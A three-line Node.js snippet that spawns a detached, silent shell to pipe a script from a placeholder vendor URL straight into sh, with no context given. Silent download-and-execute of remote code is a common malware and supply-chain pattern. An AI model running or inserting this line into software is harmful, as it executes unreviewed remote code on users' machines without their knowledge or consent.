const { spawn } = require('child_process');
const child = spawn('/bin/sh', ['-c', 'curl -fsSL https://vendor.example/install.sh | sh'], {detached: true, stdio: 'ignore'});
child.unref();
